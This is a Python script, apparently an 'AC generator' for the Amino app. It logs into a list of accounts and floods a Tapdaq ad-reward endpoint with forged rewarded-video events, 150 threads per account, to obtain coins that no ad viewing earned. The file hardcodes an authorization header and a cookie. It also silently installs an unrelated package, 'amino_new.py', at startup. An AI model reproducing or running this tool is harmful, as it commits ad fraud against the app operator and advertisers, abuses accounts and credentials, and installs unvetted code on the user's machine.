import getpass
import uuid
from uuid import uuid4
import threading
from threading import Thread
import json
from os import path
import os
os.system("pip install amino_new.py==4.2.2")
try:
	import colorama
except ModuleNotFoundError:
		os.system("pip install colorama")
		import colorama
try:
    import pyfiglet
except ModuleNotFoundError:
    	os.system("pip install pyfiglet")
    	import pyfiglet
try:
        import requests
except ModuleNotFoundError:
        os.system("pip install requests")
        import requests
try:
        import amino                        
except ModuleNotFoundError:
         os.system("pip install amino==13.0.1")
         import amino
          
colorama.init()
print(colorama.Fore.YELLOW)
print(colorama.Style.NORMAL)
f = pyfiglet.Figlet(font='slant')
print (f.renderText('AC'))
f = pyfiglet.Figlet(font='slant')
print (f.renderText('GENERATOR'))

print ("-Made by Parttimer")
print ("-Moded by Éxtasis")

ear=[]
t = open('emails.txt','r')
for m in t.read().splitlines():
    temp=m
    # for fx in range(0,len(temp)):
    #     temp=temp[:len(temp)-1]

    ear.append(str(temp))
t.close
 
#client = amino.Client("178AE9B9C6468096B9fE91B6AE25E83494B5C72BC73B488f0641BDB220512DAFD837620E38E8205D98")
headers={
        "cookies":"__cfduid=d0c98f07df2594b5f4aad802942cae1f01619569096",
        "authorization":"Basic NWJiNTM0OWUxYzlkNDQwMDA2NzUwNjgwOmM0ZDJmYmIxLTVlYjItNDM5MC05MDk3LTkxZjlmMjQ5NDI4OA=="
    }
 
def extra(fo:str):
    data = {
        "reward":{"ad_unit_id":"t00_tapjoy_android_master_checkinwallet_rewardedvideo_322","credentials_type":"publisher","custom_json":{"hashed_user_id":f"{fo}"},"demand_type":"sdk_bidding","event_id":None,"network":"facebook","placement_tag":"default","reward_name":"Amino Coin","reward_valid":"true","reward_value":2,"shared_id":"dc042f0c-0c80-4dfd-9fde-87a5979d0d2f","version_id":"1569147951493","waterfall_id":"dc042f0c-0c80-4dfd-9fde-87a5979d0d2f"},
        "app":{"bundle_id":"com.narvii.amino.master","current_orientation":"portrait","release_version":"3.4.33567","user_agent":"Dalvik\/2.1.0 (Linux; U; Android 10; G8231 Build\/41.2.A.0.219; com.narvii.amino.master\/3.4.33567)"},"date_created":1620295485,"session_id":"49374c2c-1aa3-4094-b603-1cf2720dca67","device_user":{"country":"US","device":{"architecture":"aarch64","carrier":{"country_code":602,"name":"Vodafone","network_code":0},"is_phone":"true","model":"GT-S5360","model_type":"Samsung","operating_system":"android","operating_system_version":"29","screen_size":{"height":2260,"resolution":2.55,"width":1080}},"do_not_track":"false","idfa":"7495ec00-0490-4d53-8b9a-b5cc31ba885b","ip_address":"","locale":"en","timezone":{"location":"Asia\/Seoul","offset":"GMT+09:00"},"volume_enabled":"true"}
        }
    event=uuid4()
    data["reward"]["event_id"]=f"{event}"
    try:
        requests.post("https://ads.tapdaq.com/v4/analytics/reward",json=data, headers=headers)
    except:
    	pass
 
password= input("Contraseña de las cuentas: ")
for email in ear:
    try:
    	client=amino.Client()
    	client.login(email=email,password=password)
    	#fo=client.userId
    	coins = client.get_wallet_info().totalCoins
    	print(f"Antes: {coins}")
    	fo=client.userId
    	for _ in range(150):
    	       try:
    	       	threading.Thread(target=extra,args=(fo,)).start()
    	       except:
    	       	pass
    	coins = client.get_wallet_info().totalCoins
    	print(f"Después: {coins}")
    except Exception as e:
    	print(e)
    	pass